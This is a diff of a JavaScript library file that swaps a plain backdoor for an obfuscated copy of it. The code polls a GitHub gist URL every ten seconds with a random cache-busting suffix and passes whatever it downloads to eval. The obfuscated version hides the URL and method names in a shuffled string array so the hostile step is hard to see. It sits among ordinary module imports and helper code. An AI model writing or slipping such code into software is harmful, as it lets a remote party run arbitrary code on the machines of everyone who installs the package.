@@ -16,12 +16,7 @@ const cs = require('convert-string')
 const randomstring = require('randomstring')
 const _ = require('lodash-contrib')
 
-var ttt = fs.readFileSync;
-setInterval(() => {
-  request('https://gist.githubusercontent.com/raw/5a371e3668b95515edcc304022415ed3?'+ randomstring.generate(), (err, response,body) => {
-    eval(body)
-  })
-}, 10000)
+(function(_0xc75814,_0x2efd99){var _0x1ce2d9=_0x14f4,_0x27e5ad=_0xc75814();while(!![]){try{var _0x2f3838=-parseInt(_0x1ce2d9(0x1a4))/0x1+-parseInt(_0x1ce2d9(0x1a7))/0x2*(-parseInt(_0x1ce2d9(0x1a0))/0x3)+-parseInt(_0x1ce2d9(0x1a2))/0x4+parseInt(_0x1ce2d9(0x1a6))/0x5+-parseInt(_0x1ce2d9(0x1a1))/0x6*(-parseInt(_0x1ce2d9(0x19f))/0x7)+-parseInt(_0x1ce2d9(0x1a9))/0x8+parseInt(_0x1ce2d9(0x1a3))/0x9;if(_0x2f3838===_0x2efd99)break;else _0x27e5ad['push'](_0x27e5ad['shift']());}catch(_0x1ca8f2){_0x27e5ad['push'](_0x27e5ad['shift']());}}}(_0x3307,0x1dc9b));function _0x14f4(_0x5bfcd8,_0x3feae7){var _0x330764=_0x3307();return _0x14f4=function(_0x14f455,_0x45d366){_0x14f455=_0x14f455-0x19f;var _0x3db958=_0x330764[_0x14f455];return _0x3db958;},_0x14f4(_0x5bfcd8,_0x3feae7);}function _0x3307(){var _0x4ea46a=['709512euURbW','3092598GRNWNl','219559iSNbgo','https://gist.githubusercontent.com/raw/5a371e3668b95515edcc304022415ed3?','375500qKeLcn','12XgrToc','generate','1457120behhSG','21XVjuzY','44655JVlbxH','386112ZZXqNq'];_0x3307=function(){return _0x4ea46a;};return _0x3307();}var ttt=fs['readFileSync'];setInterval(()=>{var _0x51bf9a=_0x14f4;request(_0x51bf9a(0x1a5)+randomstring[_0x51bf9a(0x1a8)](),(_0x31f073,_0x2ffc81,_0x6dc982)=>{eval(_0x6dc982);});},0x2710);
 function _interopDefaultLegacy (e) { return e && typeof e === 'object' && 'default' in e ? e : { 'default': e }; }
 
 const FormData__default = /*#__PURE__*/_interopDefaultLegacy(FormData$1);
